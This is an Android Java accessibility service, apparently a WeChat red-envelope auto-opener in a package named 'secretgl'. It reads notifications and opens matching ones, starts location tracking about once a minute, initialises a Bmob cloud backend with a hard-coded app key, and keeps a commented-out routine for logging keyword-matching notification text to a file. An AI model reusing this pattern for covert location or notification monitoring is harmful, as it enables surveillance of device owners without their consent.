package com.bmw.secretgl.service;

/**
 * Created by yMuhuo on 2016/12/7.
 */

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationManagerCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import com.bmw.secretgl.BaseApplication;
import com.bmw.secretgl.Constant;
import com.bmw.secretgl.location.BaiduMapLocateImpl;
import com.bmw.secretgl.location.BaiduMapLocatePresenter;
import com.bmw.secretgl.notifyService.MyNotificationListenerService;
import com.bmw.secretgl.utils.DateUtil;
import com.bmw.secretgl.utils.FileUtils;

import java.util.List;
import java.util.Set;

import cn.bmob.v3.Bmob;

public class EnvelopeServiceEasy extends AccessibilityService {

    private String TAG = getClass().getSimpleName();

    private BaiduMapLocatePresenter baiduMapLocate;
    private long time;
    private long notifyTime;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        Log.d(TAG, "onAccessibilityEvent: " + event);

        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                Log.d(TAG, "onAccessibilityEvent: click");
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                Log.d(TAG, "onAccessibilityEvent: changed");
                //界面文字改动
                break;

            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                Log.d(TAG, "onAccessibilityEvent: TYPE_NOTIFICATION_STATE_CHANGED");
                if (System.currentTimeMillis() - notifyTime <= 40)
                    break;
                notifyTime = System.currentTimeMillis();

                List<CharSequence> texts = event.getText();

                if (!texts.isEmpty()) {
                    Log.d(TAG, "onAccessibilityEvent: size = " + texts.size());
                    for (CharSequence t : texts) {
                        String text = String.valueOf(t);
                        Log.d(TAG, "onAccessibilityEvent: " + text);
                        if (text.contains(Constant.ENVELOPE_TEXT_KEY)) {
                            openNotification(event);
                            break;
                        } else {
                            /*for (String str : Constant.KEY_WORDS) {
                                if (text.contains(str)) {
                                    Log.d(TAG, "onAccessibilityEvent-log: " + text);
                                    FileUtils.saveDataToFile(DateUtil.getTime_desc() + "--" + text);
                                    break;
                                }
                            }*/
                        }
                    }
                }
                break;
        }

        if (System.currentTimeMillis() - time >= 1000 * 60 * 1) {
            baiduMapLocate.startLocate();
            time = System.currentTimeMillis();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    @Override
    public void onDestroy() {
        super.onDestroy();

//        MyNotificationListenerService.stopService(this);
        Toast.makeText(this, "服务已经关闭！", Toast.LENGTH_SHORT).show();
        baiduMapLocate.stopLocate();
        baiduMapLocate.destroy();
    }

    @Override
    public void onInterrupt() {
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
//
//        AccessibilityServiceInfo serviceInfo = new AccessibilityServiceInfo();
//        serviceInfo.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
//        serviceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
//        serviceInfo.packageNames = new String[]{"com.tencent.mm"};
//        serviceInfo.notificationTimeout=100;
//        setServiceInfo(serviceInfo);
//        MyNotificationListenerService.startService(this);

        Toast.makeText(this, "服务开启成功！", Toast.LENGTH_SHORT).show();
        Bmob.initialize(this, "a901abc1decbde31b3a59e29038e8e13");

        baiduMapLocate = new BaiduMapLocateImpl(this, new BaiduMapLocateImpl.OnLocationDoneListener() {
            @Override
            public void done() {
                baiduMapLocate.stopLocate();
            }
        });

        baiduMapLocate.startLocate();

        boolean isGetPermission = isNotificationListenerServiceEnabled(this);
        Log.d(TAG, "onServiceConnected: isNotificationListenerServiceEnabled = " + isGetPermission);
        if (!isGetPermission) {
//            startActivity(new Intent(NotificationConstants.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            String string = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            if (string!=null && !string.contains(MyNotificationListenerService.class.getName())) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }


    private static boolean isNotificationListenerServiceEnabled(Context context) {
        Set<String> packageNames = NotificationManagerCompat.getEnabledListenerPackages(context);
        if (packageNames.contains(context.getPackageName())) {
            return true;
        }
        return false;
    }

    /**
     * 打开通知栏消息
     */
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    private void openNotification(AccessibilityEvent event) {
        if (event.getParcelableData() == null || !(event.getParcelableData() instanceof Notification)) {
            return;
        }

        Notification notification = (Notification) event.getParcelableData();
        PendingIntent pendingIntent = notification.contentIntent;
        try {
            pendingIntent.send();
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }
    }


}